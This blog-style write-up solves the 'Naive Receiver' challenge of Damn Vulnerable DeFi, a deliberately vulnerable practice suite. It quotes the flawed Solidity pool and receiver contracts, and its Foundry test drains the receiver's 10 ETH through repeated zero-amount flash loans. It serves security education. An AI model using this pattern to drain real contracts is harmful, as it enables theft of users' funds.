# How to Weaponize a Lender Pool — The Trust Fall in DVDF's Naive Receiver

**Author:** ShiningSugar  
**Date:** 2025-11-03  
**Tags:** Smart Contract Security, DeFi, External Call Vulnerability

-----

## 1. Background: The "Naive" Victim

This is my second post in the Damn Vulnerable DeFi (DVDF) series. After "bricking" the Unstoppable pool, I moved on to **#2 "Naive Receiver"**.

The setup was different this time:
* **The Weapon:** A lender pool (`NaiveReceiverLenderPool.sol`) holding 100 ETH.
* **The Victim:** A flash loan receiver contract (`FlashLoanReceiver.sol`) holding 10 ETH.

The mission was not to drain the pool, but to **drain the *victim's* 10 ETH, using the pool as an unwitting accomplice.** This challenge is a classic example of how insecure interaction patterns between contracts can lead to disaster.

## 2. The Fatal Handshake

### The Victim: FlashLoanReceiver.sol

The `Receiver` contract has a function meant to be called by the `Pool` to receive a flash loan. Look closely at how it calculates the repayment:

**`// src/Contracts/naive-receiver/FlashLoanReceiver.sol`**

```solidity
function receiveEther(uint256 fee) public payable {
    if (msg.sender != pool) revert SenderMustBePool();

    // The FATAL FLAW is right here
    uint256 amountToBeRepaid = msg.value + fee; 

    if (address(this).balance < amountToBeRepaid) {
        revert CannotBorrowThatMuch();
    }

    _executeActionDuringFlashLoan();

    // Return funds to pool
    pool.sendValue(amountToBeRepaid);
}
````

The flaw is subtle but deadly: **The contract trusts the `fee` parameter passed to it.** It *assumes* the caller (the Pool) is sending an honest `fee` value and never validates this `fee` itself.

### The Weapon: NaiveReceiverLenderPool.sol

The `Pool` contract has a public `flashLoan` function which was designed to lend ETH and charge a `FIXED_FEE` of 1 ETH. But the implementation has two critical oversights:

**`// src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol`**

```solidity
function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {
    // ... (checks) ...

    // OVERSIGHT #1: The Pool passes the FIXED_FEE as a parameter
    borrower.functionCallWithValue(
        abi.encodeWithSignature("receiveEther(uint256)", FIXED_FEE), 
        borrowAmount
    );

    // OVERSIGHT #2: This logic runs even if borrowAmount == 0
    if (address(this).balance < balanceBefore + FIXED_FEE) {
        revert FlashLoanHasNotBeenPaidBack();
    }
}
```

Here's the problem:

1.  **Anyone can call `flashLoan`**.
2.  If an attacker calls it with `borrowAmount = 0`, the Pool will *still* call the `Receiver`'s `receiveEther` function, passing `FIXED_FEE` (1 ETH) as the `fee` parameter.

## 3. Draining by 1 ETH Cuts

The attack plan is now clear:

1.  As the attacker, I call `pool.flashLoan(victim_address, 0)`.
2.  The `Pool` (the Weapon) turns around and calls `victim.receiveEther(1 ether)` with `msg.value = 0`.
3.  The `Victim` (Naive Receiver) executes its flawed logic:
      * `fee = 1 ether` (from the parameter)
      * `msg.value = 0`
      * `amountToBeRepaid = 0 + 1 ether`
4.  The `Victim` then dutifully sends **1 ETH from its own funds** back to the `Pool` to "repay" a loan it never really got.
5.  Since the `Victim` has 10 ETH, I just need to repeat this 10 times in a single transaction.

**`// test/naive-receiver/NaiveReceiver.t.sol`**

```solidity
function testExploit() public {
    
    vm.startPrank(attacker);

    // The Receiver has 10 ETH (ETHER_IN_RECEIVER).
    // The Pool's fixed fee is 1 ETH (1e18).
    // 10 / 1 = 10 calls needed.
    uint256 exploitCalls = ETHER_IN_RECEIVER / 1e18;

    for (uint256 i = 0; i < exploitCalls; i++) {
        // Repeatedly call the POOL with a 0-amount loan.
        // The POOL then forces the RECEIVER to pay 1 ETH each time.
        pool.flashLoan(address(receiver), 0);
    }

    vm.stopPrank();

    // Final check
    validation();
}
```

The loop executes 10 times, draining the `Receiver`'s 10 ETH balance, transferring it all to the `Pool`.

## 4. Key Lessons

This challenge was a perfect reminder that auditing contracts in isolation isn't enough. The *interaction patterns* between contracts are often the source of the most devastating vulnerabilities.
